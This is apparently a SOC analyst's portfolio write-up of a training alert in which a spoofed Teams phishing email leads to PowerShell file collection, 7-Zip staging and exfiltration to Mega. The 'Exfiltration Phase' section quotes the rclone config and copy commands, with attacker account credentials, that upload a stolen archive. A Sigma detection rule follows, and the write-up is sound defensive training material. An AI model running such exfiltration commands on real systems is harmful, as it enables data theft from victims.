

# SOC212 - Data Leakage via Rclone and Mega 

## 🚨 Raw Alert Details
```text
EventID : 164
Event Time : 2023-07-04T14:10:59+03:00
Rule : SOC212 - Data Leakage - Mega Exfiltration
Role : Incident Responder
Alert Type : Data Leakage
Difficulty : Hard
MITRE ATT&CK : T1566.001, T1059.001, T1005, T1119, T1560, T1567.002
Hostname : Noelle
IP Address : 172.16.17.151
Command Line : rclone.exe config create remote mega user vavoye2649@eimatro.com pass VforH4ck1337exfMega
EDR Action : Allowed
Trigger Reason : Rclone Execution via Command Line or PowerShell
```

## Alert Overview
- **Severity:** High
- **Detection Source:** EDR / PowerShell Script Block Logging (Event ID 4104)
- **Asset Affected:** Noelle (172.16.17.151 - Windows 10)
- **Threat Type:** Spearphishing / Automated Collection / Cloud Data Exfiltration (Rclone)
- **Verdict:** True Positive (Compromised & Exfiltrated)
- **Containment Status:** Contained (Isolated)

## 🧠 Attack Context / Technical Background
This incident illustrates a modern data theft campaign leveraging **Living off the Land (LotL)** binaries combined with legitimate cloud storage APIs.

**The Mechanics:** After gaining initial access via a spoofed Microsoft Teams phishing email, the attacker drops a malicious archive containing a PowerShell stager. The script systematically enumerates the user's home profile (`$env:HOMEPATH`), filters for sensitive file extensions (`.doc`, `.pdf`, `.xls`, `.csv`, etc.), copies them to a local staging directory (`C:\backup\`), and compresses them into a single archive (`output.zip`) using 7-Zip. To exfiltrate the data, the attacker deploys **Rclone** (`rclone.exe`), a legitimate command-line cloud synchronization tool. By configuring a remote connection to **Mega** (`rclone.exe config create...`), the attacker pushes the compressed archive directly to an external, attacker-controlled cloud storage account over encrypted HTTPS, completely bypassing traditional data loss prevention (DLP) filters.

## Investigation Steps

### 1. Initial Access Verification (Phishing Triage)
The investigation began by reviewing the email delivery gateway to identify the intrusion vector.
- **Sender:** `noreply@microsoftteams.com` (Spoofed Microsoft Teams notification).
- **Subject:** `New Message On Teams`
- **Lure:** The email instructed the user to download an update file associated with Teams.
- **Payload URL:** EDR Browser History confirmed the user downloaded the payload via an AWS S3 bucket: `https://files-ld.s3.us-east-2.amazonaws.com/static/teams.zip`.

<img width="816" height="265" alt="image" src="https://github.com/user-attachments/assets/57e2b03d-917b-4b17-9ade-bf674e53dcfe" />

<img width="1212" height="251" alt="image" src="https://github.com/user-attachments/assets/8fe0a804-544e-41d1-8bf5-f901c16d1bf1" />


### 2. Collection & Staging Phase (PowerShell & 7-Zip)
Endpoint telemetry captured the PowerShell script executing automated file collection and compression.
- **Collection Script:** Scraped user directories for extensions including `.doc`, `.xls`, `.csv`, `.txt`, `.jpg`, `.pdf`, and `.docx`.
- **Staging:** Copied targeted files into `C:\backup\` and invoked 7-Zip (`7zG.exe`) to compress the collection into `output.zip`.


### 3. Exfiltration Phase (Rclone to Mega)
Further analysis of the terminal history revealed the final data leakage mechanism.
- **Rclone Configuration:** The attacker configured a remote cloud target pointing to Mega using a hardcoded attacker email and password:
  `rclone.exe config create remote mega user vavoye2649@eimatro.com pass VforH4ck1337exfMega`
- **Data Transfer:** The attacker initiated the upload:
  `rclone.exe copy C:\backup\output.zip remote:exf -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12`
- **Analysis:** Rclone successfully pushed the encrypted archive to the external Mega storage account over HTTPS.

<img width="1231" height="444" alt="image" src="https://github.com/user-attachments/assets/2bc2a042-b663-4625-a8ee-1368deea8345" />

## Analysis & Findings
The incident is a confirmed **True Positive**. The user "Noelle" fell victim to a spearphishing email impersonating Microsoft Teams. The downloaded archive executed a PowerShell collection script that scraped sensitive corporate documents, staged them into `C:\backup\`, and compressed them using 7-Zip. Finally, the attacker utilized **Rclone** to configure an external connection to a Mega cloud storage account and successfully exfiltrated the compressed data archive. The host is fully compromised, and data leakage has occurred.

## MITRE ATT&CK Mapping
| Tactic | Technique ID | Technique Name |
| :--- | :--- | :--- |
| **Initial Access** | T1566.001 | Phishing: Spearphishing Attachment |
| **Execution** | T1059.001 | Command and Scripting Interpreter: PowerShell |
| **Collection** | T1005 | Data from Local System |
| **Collection** | T1119 | Automated Collection (PowerShell scraping) |
| **Collection** | T1560 | Archive Collected Data (7-Zip compression) |
| **Exfiltration** | T1567.002 | Exfiltration Over Web Service: Exfiltration to Cloud Storage (`Rclone` to Mega) |

## Indicators of Compromise (IOCs)
| Type | Value | Context |
| :--- | :--- | :--- |
| URL | `https://files-ld.s3.us-east-2.amazonaws.com/static/teams.zip` | Malicious Payload Delivery URL (AWS S3) |
| Email / Account | `vavoye2649@eimatro.com` | Attacker Mega Cloud Account used for Exfiltration |
| Binary | `rclone.exe` | Abused LOLBin for Cloud Data Exfiltration |
| File Path | `C:\backup\output.zip` | Staged Exfiltration Archive |

## 🛠️ Detection Engineering & Hunting Logic
To improve automated detection of Rclone cloud exfiltration, the following Sigma rule has been engineered for deployment in the SIEM:

```yaml
title: Data Exfiltration via Rclone to Cloud Storage
id: d14f0598-6784-4a5e-994d-70580c5e9f11
status: experimental
description: Detects the execution of rclone.exe configuring remote connections and copying data to external cloud providers.
author: SOC Analyst Portfolio
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4688
    Image: '*\rclone.exe'
    CommandLine|contains:
      - 'config create'
      - 'copy'
      - 'remote:'
  condition: selection
falsepositives:
  - Authorized system administration or cloud backup syncing scripts managed by IT
level: high
tags:
  - attack.t1567.002
  - attack.t1560
```

## 🚀 Decision Tree 
1. **Analyze Initial Vector:** Did an alert trigger for unusual data leakage or cloud exfiltration (`rclone`)?
   - If Yes -> Proceed to EDR Terminal and Process History.
2. **Evaluate Staging Activity:** Did the host execute compression tools (`7zG.exe`, `tar`, `zip`) against user document directories?
   - *Confirmed collection into `C:\backup\` and `output.zip`.*
3. **Check Exfiltration Tools:** Did the endpoint execute synchronization utilities like `rclone`, `rclone.exe`, or `megacmd` interacting with external cloud accounts?
   - *Confirmed Rclone configuration pointing to Mega (`vavoye2649@eimatro.com`).*
4. **Action:** **Verdict: True Positive - Compromised (Data Exfiltrated).** Immediately isolate the endpoint and notify the Data Protection Officer.

## 📝 Playbook Questions & Answers
- **Should the device be isolated?**
  - *Answer:* Yes.
  - *Reasoning:* The endpoint was compromised via phishing, sensitive files were systematically scraped and archived, and data was successfully exfiltrated to an external cloud storage provider via Rclone. Immediate isolation is mandatory.
- **Determine the Scope:**
  - *Answer:* No (Localized to one machine).
  - *Reasoning:* Threat intelligence and log analysis confirmed the phishing email and exfiltration activity were restricted solely to host `172.16.17.151`.
- **IP / URL Reputation Check:**
  - *Answer:* Yes.
  - *Reasoning:* The payload was delivered via an AWS S3 URL associated with malicious staging, and the exfiltration targeted an unauthorized external cloud storage account.
- **Attacker Infrastructure Analysis:**
  - *Answer:* External.
  - *Reasoning:* The delivery vector originated externally via phishing, and data was pushed out to a remote third-party cloud service (Mega).

## Response & Containment Actions Taken
- **Host Isolation:** The compromised endpoint (`Noelle / 172.16.17.151`) was immediately **Isolated** from the network via EDR to halt further staging or cloud synchronization tasks.
- **Email Eradication:** The spoofed Microsoft Teams phishing email was purged globally from the Exchange server.
- **Why:** Isolating the host severs active connections to the attacker's cloud drop target and prevents additional file gathering.

## Recommendations
1. **Rclone / Cloud Sync Blocking:** Implement Application Control (AppLocker/WDAC) to block the execution of unauthorized synchronization tools like `rclone.exe` across standard user workstations.
2. **DLP Policy Tuning:** Configure Endpoint Data Loss Prevention (DLP) to alert or block mass file compression (`.zip`, `.7z`) combined with execution of command-line cloud clients targeting personal or unapproved cloud accounts.
3. **Credential Audit:** Review authentication logs for the user `Noelle` to ensure their corporate credentials were not compromised or reused in the phishing process.

## ⚖️ Mistakes and Lessons Learned
- **Analyst Reflection (Recognizing Living off the Cloud Exfiltration):** When investigating data leakage, analysts often look for raw socket connections or FTP traffic. 
- **The Lesson:** Modern attackers rarely use FTP or raw sockets anymore. They use tools like **Rclone** because it routes exfiltration over standard, encrypted HTTPS (Port 443) straight into legitimate cloud providers like Mega, OneDrive, or Google Drive. Recognizing command-line arguments like `rclone config create` is vital for uncovering modern cloud exfiltration.

## 🛠️ Skills & Tools Used
- EDR Terminal History Analysis (`rclone.exe` config and copy commands)
- PowerShell Script Triage (File collection and extension filtering)
- Cloud Exfiltration Triage (Rclone & Mega abuse)
- Incident Containment (Host Isolation)
